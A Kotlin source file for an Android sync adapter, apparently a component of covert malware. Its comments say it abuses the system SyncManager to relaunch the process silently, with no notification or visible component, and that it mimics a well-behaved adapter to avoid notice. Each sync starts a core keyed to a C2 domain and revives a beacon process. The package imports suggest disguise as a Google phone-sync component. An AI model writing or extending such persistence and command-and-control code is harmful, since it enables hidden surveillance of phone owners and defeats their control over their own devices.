package com.shadow

import android.accounts.Account
import android.content.AbstractThreadedSyncAdapter
import android.content.ContentProviderClient
import android.content.Context
import android.content.SyncResult
import android.os.Bundle
import android.util.Log
import com.google.android.phonesync.BuildConfig

/**
 * The sync adapter. SyncManager calls onPerformSync on its own schedule — this is
 * the system-spawned wake path. We do almost nothing here on purpose: the value is
 * that SyncManager started our process at all, in the sync tier, with no
 * notification and no visible component.
 *
 * On each invocation we make sure the core is running (idempotent) and return.
 * We do NOT hold the sync open — a fast return keeps us looking like a normal,
 * well-behaved sync adapter rather than one that hangs the sync queue.
 */
class ShadowSyncAdapter(
    private val ctx: Context,
    autoInitialize: Boolean,
) : AbstractThreadedSyncAdapter(ctx, autoInitialize) {

    override fun onPerformSync(
        account: Account?,
        extras: Bundle?,
        authority: String?,
        provider: ContentProviderClient?,
        syncResult: SyncResult?,
    ) {
        try {
            // Idempotent: no-op if the core is already running in this process.
            ShadowCore.start(ctx, BuildConfig.C2_DOMAIN)
            // Wake the cross-process beacon host too. If the :sync process was
            // reaped, this is the thing that brings it back — and it does so from a
            // SYSTEM-spawned process, which is the strongest tier we can get free.
            DualProcess.wakeBeacon(ctx)
        } catch (e: Throwable) {
            Log.w(TAG, "onPerformSync: ${e.message}")
        }
    }

    companion object {
        private const val TAG = "ShadowSync"
    }
}